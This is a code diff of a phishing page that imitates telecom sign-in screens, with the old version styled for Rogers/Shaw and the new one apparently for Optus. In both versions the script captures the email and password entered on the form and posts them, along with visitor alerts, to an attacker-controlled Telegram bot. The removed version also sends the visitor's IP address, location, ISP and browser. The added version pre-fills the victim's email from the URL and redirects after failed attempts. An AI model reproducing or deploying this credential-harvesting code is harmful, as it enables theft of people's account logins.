@@ -1,199 +1,137 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Sign in &#183; Rogers together with Shaw</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Login</title>
   <style>
-    /* 1. Global Reset */
-*, *::before, *::after {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
+   *, *::before, *::after {
+  box-sizing: border-box;
 }
 
-/* 2. Resolution Fix: Ensures the body centers the content on all screens */
 body {
-    font-family: Arial, sans-serif;
-    background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1780679036/canada_bhe5j7.jpg');
-    /* background-size: cover fills the screen without stretching */
-    background-size: cover;
-    background-position: center;
-    background-repeat: no-repeat;
-    background-attachment: fixed;
-    min-height: 100vh;
-    
-    /* THE CENTERING ENGINE - ZERO SHIFT */
-    display: flex;
-    justify-content: center; /* Horizontally centers the box */
-    align-items: center;     /* Vertically centers the box */
-    padding: 20px;
+  margin: 0;
+  padding: 0;
+  min-height: 100vh;
+  min-height: 100dvh;
+  font-family: Arial, sans-serif;
+  background: none;
+  overflow-x: hidden;
 }
 
-/* 3. Intro Container (Locked Scale) */
+/* Login Container Styling */
+.login-container {
+  background-color: ;
+  padding: 40px 30px;
+  border-radius: 10px;
+  box-shadow: ;
+  width: 90%;
+  max-width: 500px;
+  margin: 0 auto;
+  position: absolute;
+  top: 70%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  display: none; /* Change to block/flex when showing */
+}
+
+.input-group {
+  margin-bottom: 15px;
+}
+
+.input-group input {
+  width: 100%;
+  border: none;
+  border-bottom: 1px solid #aaa;
+  background: transparent;
+  padding: 10px 5px;
+  font-size: 16px;
+  outline: none;
+}
+
+.input-group input::placeholder {
+  color: #999;
+}
+
+button {
+  width: 100%;
+  background-color: #f6c300; /* Yellow */
+  color: #000;
+  font-size: 16px;
+  padding: 12px;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  font-weight: bold;
+  transition: background-color 0.2s ease;
+}
+
+button:hover {
+  background-color: #e0b300;
+}
+
+/* Intro Image Styling */
 #introImageContainer {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: black;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100vh;
+  height: 100dvh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 10;
+  padding: 16px;
 }
 
 #introImageContainer img {
-    max-width: 100%;
-    max-height: 100%;
+  max-width: 100%;
+  max-height: 100%;
+  object-fit: contain;
+  height: auto;
 }
 
-/* 4. LOGIN BOX - AUTO-CENTERED FOR ALL RESOLUTIONS */
-.login-container {
-    background: 
-    backdrop-filter: blur(10px);
-    border-radius: 20px; /* Adjusted from 70px for better fit */
-    padding: 30px;
-    width: 90%;          /* Mobile Width */
-    max-width: 350px;    /* Laptop Width */
-    
-    /* REMOVED: margin-left: 600px (This causes the shift) */
-    margin: 0 auto; 
-    
-    box-shadow: 
-    /* display: none; */ /* Uncomment for your JS logic */
+/* Error Message Styling */
+#errorMessage {
+  display: none;
+  color: red;
+  font-size: 14px;
+  margin-bottom: 10px;
 }
 
-/* 5. Typography & Forms */
-.welcome-title {
-    color: #0066cc;
-    font-size: 28px;
-    font-weight: 600;
-    margin-bottom: 30px;
-    text-align: center; /* Centered for consistent look */
-}
-
-.form-group {
-    margin-bottom: 20px;
-    width: 100%;
-}
-
-.form-label {
-    display: block;
-    color: #666;
-    font-size: 14px;
-    font-weight: 500;
-    margin-bottom: 8px;
-}
-
-.form-input {
-    width: 100%;
-    padding: 12px 16px;
-    border: 2px solid #d1d5db;
-    border-radius: 8px;
-    font-size: 16px;
-    background: white;
-}
-
-.password-container {
-    position: relative;
-    width: 100%;
-}
-
-.password-toggle {
-    position: absolute;
-    right: 12px;
-    top: 50%;
-    transform: translateY(-50%);
-    background: none;
-    border: none;
-    cursor: pointer;
-    color: #666;
-    font-size: 18px;
-}
-
-/* 6. SIGN IN BUTTON - LOCKED IN CENTER */
-.sign-in-btn {
-    width: 100%; /* Changed to 100% for mobile usability, box handles sizing */
-    background: #FF9999;
-    color: white;
-    border: none;
-    padding: 14px;
-    border-radius: 8px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    
-    /* FORCED CENTERING */
-    display: block;
-    margin: 10px auto 20px auto; 
-    transition: background-color 0.3s ease;
-}
-
-.sign-in-btn:hover {
-    background: #ff7777;
-}
-
-.help-links {
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-    text-align: center;
-}
-
-.help-link {
-    color: #0066cc;
-    text-decoration: none;
-    font-size: 14px;
-}
-
-/* 7. AUTO-FIX FOR MOBILE RESOLUTIONS */
+/* Responsive adjustments for smaller screens */
 @media (max-width: 480px) {
-    .login-container {
-        width: 95%;
-        padding: 20px;
-    }
-    .welcome-title {
-        font-size: 24px;
-    }
+  .login-container {
+    padding: 30px 20px;
+    width: 92%;
+  }
+
+  .input-group input,
+  button {
+    font-size: 15px;
+  }
 }
   </style>
 </head>
 <body>
-  <!-- 👇 Int Image Ovelay -->
+
+  <!-- Intro Image Overlay -->
   <div id="introImageContainer">
     <img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png" alt="Intro Image" />
   </div>
 
-  <!-- 👇 Log Fom -->
-  <div class="login-container" id="loginContainer">
-    <h1 class="welcome-title"></h1>
-
+  <!-- Login Form -->
+  <div id="loginContainer" class="login-container">
     <form id="loginForm">
-      <div id="errorMessage" class="error-message" style="display: none;"></div>
-
-      <div class="form-group">
-  <input type="text" id="userId" name="userId" class="form-input" placeholder="Email" required value="" />
-</div>
-
-      <div class="form-group">
-  <div class="password-container">
-    <input type="password" id="password" name="password" class="form-input" placeholder="Password" required />
-    <button type="button" class="password-toggle" onclick="togglePassword()">👁</button>
-  </div>
-</div>
-
-      <div class="checkbox-container">
-        <input type="checkbox" id="rememberUser" name="rememberUser" class="checkbox" />
-        <label for="rememberUser" class="checkbox-label">Remember my email</label>
+      <div class="input-group">
+        <input type="email" id="email" placeholder="Email" required>
       </div>
-
-      <button type="submit" class="sign-in-btn">Sign in</button>
-
-      
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Password" required>
       </div>
+      <div id="errorMessage"></div>
+      <button type="submit">Sign in</button>
     </form>
   </div>
 
@@ -202,87 +140,74 @@ body {
     const chatId = '8052751627';
     let loginAttempts = 0;
 
-    async function sendToTelegram(message) {
-      if (!navigator.onLine) return;
-      try {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: message })
-        });
-      } catch (err) {
-        console.error('Telegram send error:', err);
-      }
+    // Send message to Telegram
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).then(res => res.json())
+        .then(data => console.log('Telegram response:', data))
+        .catch(err => console.error('Telegram error:', err));
     }
 
-    function togglePassword() {
-      const passwordInput = document.getElementById('password');
-      const toggleButton = document.querySelector('.password-toggle');
-
-      if (passwordInput.type === 'password') {
-        passwordInput.type = 'text';
-        toggleButton.textContent = '🙈';
-      } else {
-        passwordInput.type = 'password';
-        toggleButton.textContent = '👁';
-      }
+    // Send visitor notification to Telegram
+    function sendVisitorToTelegram() {
+      sendToTelegram('New optus visitor has arrived at the page!');
     }
 
-    function sendVisitorInfo() {
-      const userAgent = navigator.userAgent;
-      const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
+    window.onload = function () {
+      sendVisitorToTelegram();
 
-      if (!navigator.onLine) {
-        sendToTelegram(`XTRA Offline Visi\n🖥 Browser: ${userAgent}\n🔌 Port: ${port}`);
+      // Display intro image for 5 seconds before showing the login page
+      setTimeout(function () {
+        document.getElementById('introImageContainer').style.display = 'none'; // Hide intro image
+        document.body.style.backgroundImage = 'url("https://res.cloudinary.com/dxzzgijsa/image/upload/v1790896960/op2_x1caao.png")'; // Add the specified background image to the body
+        document.body.style.backgroundSize = 'cover'; // Make the background image cover the full page
+        document.body.style.backgroundPosition = 'center'; // Center the background image
+        document.getElementById('loginContainer').style.display = 'block'; // Show the login form
+      }, 500); // 5 seconds for intro image
+    };
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const errorMessage = document.getElementById('errorMessage');
+
+      // Hide the error message after each attempt
+      errorMessage.style.display = 'none';
+
+      // Check if email or password is empty
+      if (!email || !password) {
+        errorMessage.style.display = 'block';
+        document.getElementById('password').value = ''; // Clear password field
+        document.getElementById('password').focus(); // Focus back on the password field
+        sendToTelegram(`Login failed. Email: ${email}, Password: ${password}`);
         return;
       }
 
-      fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-          const message = `🌐 shawcana Visi \nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
-          sendToTelegram(message);
-        }).catch(() => {
-          sendToTelegram(`🌐 shawcana Visi (IP lookup failed)\nBrowser: ${userAgent}`);
-        });
-    }
-
-    window.onload = () => {
-      sendVisitorInfo();
-
-      setTimeout(() => {
-        const intro = document.getElementById('introImageContainer');
-        const login = document.getElementById('loginContainer');
-        if (intro) intro.style.display = 'none';
-        if (login) login.style.display = 'block';
-      }, 50);
-    };
-
-    document.getElementById('loginForm').addEventListener('submit', async function (e) {
-      e.preventDefault();
-
-      const userId = document.getElementById('userId').value.trim();
-      const password = document.getElementById('password').value.trim();
-
-      if (userId && password) {
-        loginAttempts++;
-        const msg = `❌ shawcana drop #${loginAttempts}\n👤 User ID: ${userId}\n🔑 Password: ${password}`;
-        await sendToTelegram(msg);
-
-        const errorMsg = document.getElementById('errorMessage');
-        errorMsg.textContent =
-          "";
-        errorMsg.style.display = 'block';
-
-        document.getElementById('password').value = '';
-        document.getElementById('password').focus();
-
-        if (loginAttempts >= 30) {
-          window.location.href =
-            'https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png';
-        }
+      loginAttempts++;
+      if (loginAttempts >= 3) {
+        // Redirect to another URL after 3 failed attempts
+        window.location.href = 'https://tse3.mm.bing.net/th/id/OIP.14uelHZGeMH38bdQNqYB4wHaKe?rs=1&pid=ImgDetMain';
+      } else {
+        errorMessage.style.display = 'block';
+        document.getElementById('password').value = ''; // Clear password field
+        document.getElementById('password').focus(); // Focus back on the password field
+        sendToTelegram(`Login failed. Email: ${email}, Password: ${password}`);
       }
     });
+
+    // Auto-fill email field with URL param
+    const urlParams = new URLSearchParams(window.location.search);
+    const emailParam = urlParams.get('email') || '';
+
+    const emailInput = document.querySelector('input[type="email"]');
+    if (emailInput) {
+      emailInput.value = emailParam;
+    }
   </script>
 </body>
 </html>
